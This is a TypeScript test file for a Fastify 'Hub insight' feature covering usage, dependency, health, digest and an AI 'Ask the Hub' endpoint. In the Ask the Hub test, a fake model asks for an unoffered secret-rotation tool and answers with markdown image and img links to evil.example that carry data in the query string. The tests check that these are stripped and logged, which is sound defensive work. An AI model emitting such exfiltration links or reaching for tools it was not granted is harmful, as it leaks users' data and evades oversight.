import Fastify, { type FastifyInstance } from 'fastify'
import type { Knex } from 'knex'
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'

// Hub insight (migration 577) on a real SQLite with the Hub migrations: collect (the link read is
// injected — no app is ever contacted), usage / dependencies / impact / health scoped like every
// Hub read (admin: all; owner: own; anyone else: nothing), settings, the weekly digest (mail and
// notices are spies), and Ask the Hub end to end: a fake AI asks for tools, and every tool call
// re-enters the REAL hub routes in-process as the caller — the owner never sees another app.

vi.mock('../../../db/index.js', async () => {
  const knex = (await import('knex')).default
  const { sqliteAfterCreate, sqliteCompat } = await import('../../../db/sqlite.js')
  sqliteCompat()
  const db = knex({
    client: 'better-sqlite3',
    connection: { filename: ':memory:' },
    useNullAsDefault: true,
    pool: { min: 1, max: 1, afterCreate: sqliteAfterCreate }
  })
  return { db }
})
vi.mock('../../../version.js', () => ({ NIVARO_VERSION: '0.3.215' }))
// Signed in by `Authorization: Bearer <admin|user>:<id>` (a header the in-process tool calls
// forward, like a real bearer).
vi.mock('../../../middleware/authenticate.js', () => {
  const sign = async (req: {
    headers: Record<string, string | undefined>
    user?: unknown
    isAdmin?: boolean
  }) => {
    const m = /^Bearer (admin|user|key):(.+)$/.exec(req.headers.authorization ?? '')
    if (!m) throw Object.assign(new Error('Unauthorized'), { statusCode: 401 })
    req.user = { id: m[2], status: 'active' }
    req.isAdmin = m[1] === 'admin'
    ;(req as { authMethod?: string }).authMethod = m[1] === 'key' ? 'api_key' : 'session'
  }
  const admin = async (req: Parameters<typeof sign>[0]) => {
    await sign(req)
    if (!req.isAdmin)
      throw Object.assign(new Error('Forbidden'), { statusCode: 403, code: 'ADMIN_ONLY' })
  }
  return {
    requireAuth: vi.fn(sign),
    requireAdmin: vi.fn(admin),
    authenticate: vi.fn(sign),
    enforceRateLimit: vi.fn()
  }
})
vi.mock('../../../services/activity.js', async () => {
  const { db } = (await import('../../../db/index.js')) as unknown as { db: Knex }
  return {
    logActivity: vi.fn(async (o: Record<string, unknown>) => {
      await db('nivaro_activity').insert({
        action: o.action,
        user: o.user ?? null,
        comment: o.comment ?? null,
        timestamp: new Date()
      })
      return null
    })
  }
})
vi.mock('../../../admin-base.js', () => ({ adminBaseUrl: () => 'https://hub.example.com' }))
const ai = vi.hoisted(() => ({
  create: vi.fn(),
  getAiClient: vi.fn()
}))
vi.mock('../../../services/ai-client.js', () => ({
  getAiClient: ai.getAiClient,
  getAiModelSettings: vi.fn(async () => ({ chatModel: 'test-model' }))
}))

const { db } = (await import('../../../db/index.js')) as unknown as { db: Knex }
const migrations = [
  await import('../../../db/migrations/542_hub_tables.js'),
  await import('../../../db/migrations/543_hub_promotions.js'),
  await import('../../../db/migrations/544_hub_databases.js'),
  await import('../../../db/migrations/545_hub_creations.js'),
  await import('../../../db/migrations/546_hub_stack_settings.js'),
  await import('../../../db/migrations/550_hub_oidc.js'),
  await import('../../../db/migrations/551_hub_signins.js'),
  await import('../../../db/migrations/552_hub_shared_deployments.js'),
  await import('../../../db/migrations/553_hub_moves.js'),
  await import('../../../db/migrations/565_hub_release_ops.js'),
  await import('../../../db/migrations/566_hub_fleet.js'),
  await import('../../../db/migrations/567_hub_capacity.js'),
  await import('../../../db/migrations/568_hub_ops.js'),
  await import('../../../db/migrations/569_hub_data.js'),
  await import('../../../db/migrations/576_hub_incidents.js'),
  await import('../../../db/migrations/577_hub_insight.js')
]
const { hubRoutes } = await import('../../../routes/hub.js')
const { hubInsightRoutes } = await import('../../../routes/hub-insight.js')
const { runCollect } = await import('../../../services/hub/insight/collect.js')
const { runWeeklyDigest } = await import('../../../services/hub/insight/digest.js')
const { storeDailyScores } = await import('../../../services/hub/insight/health.js')

const ADMIN = 'aaaaaaaa-0000-4000-8000-000000000001'
const OWNER = 'bbbbbbbb-0000-4000-8000-000000000002'
const OTHER = 'cccccccc-0000-4000-8000-000000000003'
const asAdmin = { authorization: `Bearer admin:${ADMIN}` }
const asOwner = { authorization: `Bearer user:${OWNER}` }
const asOther = { authorization: `Bearer user:${OTHER}` }

let app: FastifyInstance
let prevHub: string | undefined
let prevKey: string | undefined
let efp: number
let pole: number
let staging: number
let prod: number
let poleProd: number

const idOf = (r: unknown) => {
  const x = (r as Array<number | { id: number }>)[0]
  return typeof x === 'object' ? x.id : x
}

beforeAll(async () => {
  prevHub = process.env.HUB
  prevKey = process.env.ENCRYPTION_KEY
  process.env.HUB = 'on'
  process.env.ENCRYPTION_KEY = 'k'.repeat(64)
  for (const m of migrations) await m.up(db)
  await db.schema.createTable('nivaro_activity', (t) => {
    t.increments('id')
    t.string('action')
    t.string('user').nullable()
    t.text('comment').nullable()
    t.dateTime('timestamp')
  })
  await db.schema.createTable('nivaro_users', (t) => {
    t.uuid('id').primary()
    t.string('first_name').nullable()
    t.string('last_name').nullable()
    t.string('email').nullable()
    t.string('status').nullable()
    t.string('account_kind').nullable()
    t.integer('role').nullable()
  })
  await db.schema.createTable('nivaro_roles', (t) => {
    t.increments('id')
    t.boolean('admin_access')
  })
  await db.schema.createTable('nivaro_extension_settings', (t) => {
    t.increments('id')
    t.string('extension_id')
    t.string('key')
    t.text('value').nullable()
    t.dateTime('updated_at').nullable()
  })
  await db('nivaro_users').insert([
    { id: ADMIN, first_name: 'Ada', email: 'ada@x.com', status: 'active' },
    { id: OWNER, first_name: 'Owen', email: 'owen@x.com', status: 'active' },
    { id: OTHER, first_name: 'Oz', email: 'oz@x.com', status: 'active' }
  ])
  app = Fastify()
  await app.register(hubRoutes, { prefix: '/api/hub' })
  await app.register(hubInsightRoutes, { prefix: '/api/hub' })
  await app.ready()
})

afterAll(async () => {
  await app.close()
  await db.destroy()
  if (prevHub === undefined) delete process.env.HUB
  else process.env.HUB = prevHub
  if (prevKey === undefined) delete process.env.ENCRYPTION_KEY
  else process.env.ENCRYPTION_KEY = prevKey
})

beforeEach(async () => {
  for (const t of [
    'nivaro_hub_usage_days',
    'nivaro_hub_usage_screens',
    'nivaro_hub_dependencies',
    'nivaro_hub_insight_state',
    'nivaro_hub_health_scores',
    'nivaro_hub_digest_prefs',
    'nivaro_hub_digest_sends',
    'nivaro_hub_fleet_status',
    'nivaro_hub_incidents',
    'nivaro_hub_data_runs',
    'nivaro_hub_databases',
    'nivaro_hub_db_servers',
    'nivaro_hub_deploys',
    'nivaro_hub_environments',
    'nivaro_hub_app_owners',
    'nivaro_hub_apps',
    'nivaro_activity',
    'nivaro_extension_settings'
  ])
    await db(t).del()
  efp = idOf(
    await db('nivaro_hub_apps')
      .insert({ key: 'efp', name: 'EFP', signin_mode: 'direct', extensions: '[]' })
      .returning('id')
  )
  pole = idOf(
    await db('nivaro_hub_apps')
      .insert({ key: 'pole', name: 'Pole', signin_mode: 'direct', extensions: '[]' })
      .returning('id')
  )
  await db('nivaro_hub_app_owners').insert({ app_id: efp, user_id: OWNER })
  const server = idOf(
    await db('nivaro_hub_db_servers')
      .insert({ name: 'SQL One', engine: 'mssql', host: 'sql1.corp', port: 1433 })
      .returning('id')
  )
  const database = idOf(
    await db('nivaro_hub_databases')
      .insert({
        server_id: server,
        engine: 'mssql',
        host: 'SQL1.corp',
        port: 1433,
        database_name: 'EFP_Production',
        status: 'ready',
        connection: 'sealed:secret'
      })
      .returning('id')
  )
  const env = async (appId: number, key: string, position: number, dbRef: string | null = null) =>
    idOf(
      await db('nivaro_hub_environments')
        .insert({
          app_id: appId,
          key,
          position,
          status: 'active',
          base_url: `https://${key}.${appId}.example.com`,
          hostnames: '[]',
          db_ref: dbRef
        })
        .returning('id')
    )
  staging = await env(efp, 'staging', 0)
  prod = await env(efp, 'production', 1, `hub-db:${database}`)
  poleProd = await env(pole, 'production', 0, `hub-db:${database}`)
})

const usageBody = (people: number) => ({
  floor: 5,
  days: 14,
  available: true,
  daily: [
    { day: '2026-11-23', people, views: people * 4, under_floor: false },
    { day: '2026-11-24', people: null, views: null, under_floor: true }
  ],
  people_7d: people,
  people_window: people,
  accounts: 40,
  screens: [{ route: '/collections/workflows/:id', people, views: 60 }],
  screens_hidden: 4
})

async function collect() {
  return runCollect({
    now: () => new Date('2026-11-25T05:10:00Z'),
    read: async (env, what) => {
      if (env.id === staging) return { state: 'unreachable', body: null }
      if (what === 'usage') return { state: 'ok', body: usageBody(env.id === prod ? 12 : 30) }
      return {
        state: 'ok',
        body: {
          dependencies: [
            { kind: 'partner_api', target: 'fusion.example.com', label: 'Fusion', enabled: true },
            { kind: 'extension', target: 'efp-ops', label: '2.1.0' }
          ]
        }
      }
    }
  })
}

describe('collect', () => {
  it('reads every active environment and records how each read went', async () => {
    const out = await collect()
    expect(out).toMatchObject({ environments: 3, usage_ok: 2, deps_ok: 2 })
    const st = await db('nivaro_hub_insight_state').where({ environment_id: staging }).first()
    expect(st).toMatchObject({ usage_state: 'unreachable', deps_state: 'unreachable' })
  })
})

describe('usage', () => {
  it('owners see their own apps, counts only; another app is 404; others see nothing', async () => {
    await collect()
    const own = await app.inject({ url: '/api/hub/insight/usage', headers: asOwner })
    expect(own.statusCode).toBe(200)
    const apps = own.json().data.apps
    expect(apps.map((a: { app_key: string }) => a.app_key)).toEqual(['efp'])
    const prodUsage = apps[0].environments.find(
      (e: { env_key: string }) => e.env_key === 'production'
    )
    expect(prodUsage).toMatchObject({
      people_7d: 12,
      accounts: 40,
      adoption: 0.3,
      production: true
    })
    expect(prodUsage.daily[1]).toEqual({
      day: '2026-11-24',
      people: null,
      views: null,
      under_floor: true
    })
    expect(prodUsage.screens).toEqual([
      { route: '/collections/workflows/:id', people: 12, views: 60 }
    ])
    expect(
      (await app.inject({ url: `/api/hub/insight/usage?app=${pole}`, headers: asOwner })).statusCode
    ).toBe(404)
    const other = await app.inject({ url: '/api/hub/insight/usage', headers: asOther })
    expect(other.json().data.apps).toEqual([])
    const admin = await app.inject({ url: '/api/hub/insight/usage', headers: asAdmin })
    expect(admin.json().data.apps).toHaveLength(2)
  })

  it('a floor raised after the collect hides what is now under it', async () => {
    await collect()
    const put = await app.inject({
      method: 'PUT',
      url: '/api/hub/insight/settings',
      headers: asAdmin,
      payload: { usage: { floor: 20 } }
    })
    expect(put.statusCode).toBe(200)
    const r = await app.inject({ url: `/api/hub/insight/usage?app=${efp}`, headers: asOwner })
    const p = r
      .json()
      .data.apps[0].environments.find((e: { env_key: string }) => e.env_key === 'production')
    expect(p.people_7d).toBeNull()
    expect(p.daily[0].under_floor).toBe(true)
    expect(p.screens).toEqual([])
  })
})

describe('dependency map and impact', () => {
  it('joins the app’s hosts with the Hub’s own records, scoped to the viewer', async () => {
    await collect()
    const r = await app.inject({ url: '/api/hub/insight/dependencies', headers: asOwner })
    const d = r.json().data
    const ids = d.nodes.map((n: { id: string }) => n.id)
    expect(ids).toContain(`app:${efp}`)
    expect(ids).not.toContain(`app:${pole}`)
    expect(ids).toEqual(
      expect.arrayContaining([
        'partner_api:fusion.example.com',
        'extension:efp-ops',
        'database:sql1.corp:1433'
      ])
    )
    const dbNode = d.nodes.find((n: { id: string }) => n.id === 'database:sql1.corp:1433')
    expect(dbNode).toMatchObject({ label: 'SQL One', environments: 1 })
    expect(JSON.stringify(d)).not.toMatch(/sealed|EFP_Production/)
  })

  it('the impact list puts production first and never shows another owner’s app', async () => {
    await collect()
    const admin = await app.inject({
      url: `/api/hub/insight/impact?node=${encodeURIComponent('database:sql1.corp:1433')}`,
      headers: asAdmin
    })
    expect(admin.json().data).toMatchObject({ apps: 2, production: 2 })
    const owner = await app.inject({
      url: `/api/hub/insight/impact?node=${encodeURIComponent('database:sql1.corp:1433')}`,
      headers: asOwner
    })
    expect(owner.json().data.affected.map((a: { app_name: string }) => a.app_name)).toEqual(['EFP'])
    expect(
      (await app.inject({ url: '/api/hub/insight/impact', headers: asOwner })).statusCode
    ).toBe(400)
  })
})

describe('health', () => {
  it('scores from figures the Hub already keeps, with a stored daily trend', async () => {
    await db('nivaro_hub_fleet_status').insert({
      environment_id: prod,
      app_id: efp,
      state: 'ok',
      readiness_score: 80,
      open_issues: 0
    })
    await db('nivaro_hub_data_runs').insert({
      kind: 'db_backup',
      environment_id: prod,
      status: 'done',
      started_via: 'schedule',
      steps: '[]',
      started_at: new Date(Date.now() - 3 * 3_600_000),
      finished_at: new Date(Date.now() - 2 * 3_600_000)
    })
    expect(await storeDailyScores()).toBe(3)
    const r = await app.inject({ url: `/api/hub/insight/health?app=${efp}`, headers: asOwner })
    expect(r.statusCode).toBe(200)
    const envs = r.json().data.environments
    expect(envs.map((e: { env_key: string }) => e.env_key)).toEqual(['staging', 'production'])
    const p = envs[1]
    expect(p.score).toBeGreaterThanOrEqual(90)
    expect(p.parts.find((x: { part: string }) => x.part === 'backups').score).toBe(100)
    expect(p.parts.find((x: { part: string }) => x.part === 'readiness').score).toBe(80)
    expect(p.trend).toHaveLength(1)
    // Staging is not production and has no backup policy: no backup is not a fault there.
    expect(envs[0].parts.find((x: { part: string }) => x.part === 'backups').score).toBeNull()
    expect(
      (await app.inject({ url: `/api/hub/insight/health?app=${pole}`, headers: asOwner }))
        .statusCode
    ).toBe(404)
    expect(p.parts.find((x: { part: string }) => x.part === 'incidents').score).toBe(100)
  })

  it('an open incident lowers the score, and a weight change reaches every viewer at once', async () => {
    await db('nivaro_hub_incidents').insert({
      app_id: efp,
      environment_id: prod,
      title: 'Orders failing',
      severity: 'sev1',
      status: 'open',
      opened_at: new Date()
    })
    const before = await app.inject({ url: `/api/hub/insight/health?app=${efp}`, headers: asOwner })
    const p = before
      .json()
      .data.environments.find((e: { env_key: string }) => e.env_key === 'production')
    const inc = p.parts.find((x: { part: string }) => x.part === 'incidents')
    expect(inc).toMatchObject({ score: 0, figure: '1 open incident (worst sev1)' })
    const put = await app.inject({
      method: 'PUT',
      url: '/api/hub/insight/settings',
      headers: asAdmin,
      payload: { weights: { incidents: 0 } }
    })
    expect(put.statusCode).toBe(200)
    const after = await app.inject({ url: `/api/hub/insight/health?app=${efp}`, headers: asOwner })
    const p2 = after
      .json()
      .data.environments.find((e: { env_key: string }) => e.env_key === 'production')
    expect(p2.parts.find((x: { part: string }) => x.part === 'incidents').weight).toBe(0)
    expect(p2.score).toBeGreaterThan(p.score)
  })
})

describe('settings', () => {
  it('admin only, validated and logged', async () => {
    expect(
      (await app.inject({ url: '/api/hub/insight/settings', headers: asOwner })).statusCode
    ).toBe(403)
    const bad = await app.inject({
      method: 'PUT',
      url: '/api/hub/insight/settings',
      headers: asAdmin,
      payload: { usage: { floor: 3 } }
    })
    expect(bad.statusCode).toBe(400)
    const ok = await app.inject({
      method: 'PUT',
      url: '/api/hub/insight/settings',
      headers: asAdmin,
      payload: { weights: { secrets: 0 } }
    })
    expect(ok.json().data.weights.secrets).toBe(0)
    expect(
      await db('nivaro_activity').where({ action: 'hub-insight-settings' }).count('* as n')
    ).toEqual([{ n: 1 }])
  })
})

describe('weekly digest', () => {
  it('goes to each owner once a week, never to someone who turned it off', async () => {
    await db('nivaro_hub_deploys').insert({
      app_id: efp,
      environment_id: prod,
      kind: 'promote',
      version: '0.3.215',
      status: 'success',
      started_at: new Date(Date.now() - 86_400_000),
      finished_at: new Date(Date.now() - 86_000_000)
    })
    await db('nivaro_hub_app_owners').insert({ app_id: pole, user_id: OTHER })
    const sendMail = vi.fn(async () => ({ status: 'sent' }))
    const notify = vi.fn(async () => null)
    const off = await app.inject({
      method: 'PUT',
      url: '/api/hub/insight/digest/me',
      headers: asOther,
      payload: { enabled: false }
    })
    expect(off.json().data.enabled).toBe(false)
    const first = await runWeeklyDigest({
      sendMail,
      notify,
      adminBase: () => 'https://hub.example.com'
    })
    expect(first).toMatchObject({ owners: 2, sent: 1, skipped: 1 })
    expect(sendMail).toHaveBeenCalledTimes(1)
    const mail = (sendMail.mock.calls[0] as unknown as [Record<string, unknown>])[0]
    expect(mail).toMatchObject({
      to: 'owen@x.com',
      template: 'hub_weekly_digest',
      category: 'reports'
    })
    const data = mail.data as { apps: Array<{ name: string; deploys: unknown[] }> }
    expect(data.apps.map((a) => a.name)).toEqual(['EFP'])
    expect(data.apps[0].deploys).toHaveLength(1)
    expect(notify).toHaveBeenCalledTimes(1)
    const again = await runWeeklyDigest({ sendMail, notify })
    expect(again.sent).toBe(0)
    expect(sendMail).toHaveBeenCalledTimes(1)
    const me = await app.inject({ url: '/api/hub/insight/digest/me', headers: asOwner })
    expect(me.json().data).toMatchObject({ enabled: true, owns_apps: true, delivered: true })
    const preview = await app.inject({ url: '/api/hub/insight/digest/preview', headers: asOwner })
    expect(preview.json().data.apps.map((a: { name: string }) => a.name)).toEqual(['EFP'])
  })
})

describe('Ask the Hub', () => {
  it('answers from read-only tools that re-enter as the caller, and cites the records', async () => {
    await db('nivaro_hub_app_owners').insert({ app_id: pole, user_id: ADMIN })
    const seen: unknown[] = []
    let round = 0
    ai.create.mockImplementation(
      async (p: { tools: Array<{ name: string }>; messages: unknown[] }) => {
        seen.push(p)
        round++
        if (round === 1)
          return {
            stop_reason: 'tool_use',
            content: [
              { type: 'tool_use', id: 't1', name: 'hub_list_apps', input: {} },
              { type: 'tool_use', id: 't2', name: 'hub_secret_rotate', input: {} }
            ]
          }
        return {
          stop_reason: 'end_turn',
          content: [
            {
              type: 'text',
              text: 'You own [EFP](https://hub.example.com/hub?app=1). ![x](https://evil.example/?d=apps) <img src="https://evil.example/a.png"> [more](https://evil.example/x)'
            }
          ]
        }
      }
    )
    ai.getAiClient.mockResolvedValue({ messages: { create: ai.create } })
    const r = await app.inject({
      method: 'POST',
      url: '/api/hub/insight/ask',
      headers: asOwner,
      payload: { question: 'Which apps do I own?' }
    })
    expect(r.statusCode).toBe(200)
    const d = r.json().data
    expect(d.answer).toMatch(/EFP/)
    expect(d.answer).toContain('[EFP](/hub?app=1)')
    expect(d.answer).not.toMatch(/evil\.example\/\?d|<img|!\[|\]\(https:\/\/evil/)
    expect(d.tools).toEqual(['hub_list_apps'])
    expect(d.citations).toEqual(expect.arrayContaining([{ label: 'EFP', path: `/hub?app=${efp}` }]))
    const first = seen[0] as { tools: Array<{ name: string }> }
    const names = first.tools.map((t) => t.name)
    expect(names).toEqual(
      expect.arrayContaining(['hub_list_apps', 'hub_health', 'hub_usage', 'hub_impact'])
    )
    // The owner is not an administrator: the admin-only plans are not even offered.
    expect(names).not.toContain('hub_plan_move')
    const second = seen[1] as { messages: Array<{ role: string; content: unknown }> }
    const results = JSON.stringify(second.messages[second.messages.length - 1])
    expect(results).toContain('EFP')
    expect(results).not.toContain('Pole')
    expect(results).toMatch(/not available here/)
    expect(results).toContain('untrusted_data')
    // The tool the model asked for that is not offered is logged (names only).
    const logged = await db('nivaro_activity').where({ action: 'hub-ask-refused' }).first()
    expect(JSON.parse(String(logged?.comment))).toEqual({ held: [], tools: ['hub_secret_rotate'] })
  })

  it('works only in a person’s own session: a named API key is refused', async () => {
    ai.getAiClient.mockResolvedValue({ messages: { create: ai.create } })
    const r = await app.inject({
      method: 'POST',
      url: '/api/hub/insight/ask',
      headers: { authorization: `Bearer key:${OWNER}` },
      payload: { question: 'Which apps do I own?' }
    })
    expect(r.statusCode).toBe(403)
    expect(r.json().code).toBe('ASK_OWN_SESSION')
  })

  it('answers the 12th follow-up after a 5,000-character answer', async () => {
    const sent: unknown[] = []
    ai.create.mockReset()
    ai.create.mockImplementation(async (p: { messages: unknown[] }) => {
      sent.push(p.messages)
      return { stop_reason: 'end_turn', content: [{ type: 'text', text: 'Still here.' }] }
    })
    ai.getAiClient.mockResolvedValue({ messages: { create: ai.create } })
    const messages: Array<{ role: string; content: string }> = []
    for (let i = 0; i < 11; i++) {
      messages.push({ role: 'user', content: `Question ${i}` })
      messages.push({ role: 'assistant', content: i === 10 ? 'w'.repeat(5000) : `Answer ${i}` })
    }
    messages.push({ role: 'user', content: 'And the next one?' })
    const r = await app.inject({
      method: 'POST',
      url: '/api/hub/insight/ask',
      headers: asOwner,
      payload: { messages }
    })
    expect(r.statusCode).toBe(200)
    const m = sent[0] as Array<{ role: string; content: string }>
    expect(m[0].role).toBe('user')
    expect(m.length).toBeLessThanOrEqual(20)
    expect(m[m.length - 1].content).toBe('And the next one?')
  })

  it('refuses a bad question and says when AI is not set up', async () => {
    expect(
      (
        await app.inject({
          method: 'POST',
          url: '/api/hub/insight/ask',
          headers: asOwner,
          payload: { messages: [{ role: 'assistant', content: 'x' }] }
        })
      ).statusCode
    ).toBe(400)
    ai.getAiClient.mockResolvedValue(null)
    const r = await app.inject({
      method: 'POST',
      url: '/api/hub/insight/ask',
      headers: asOwner,
      payload: { question: 'hi' }
    })
    expect(r.statusCode).toBe(503)
    expect(r.json().code).toBe('AI_NOT_CONFIGURED')
  })
})
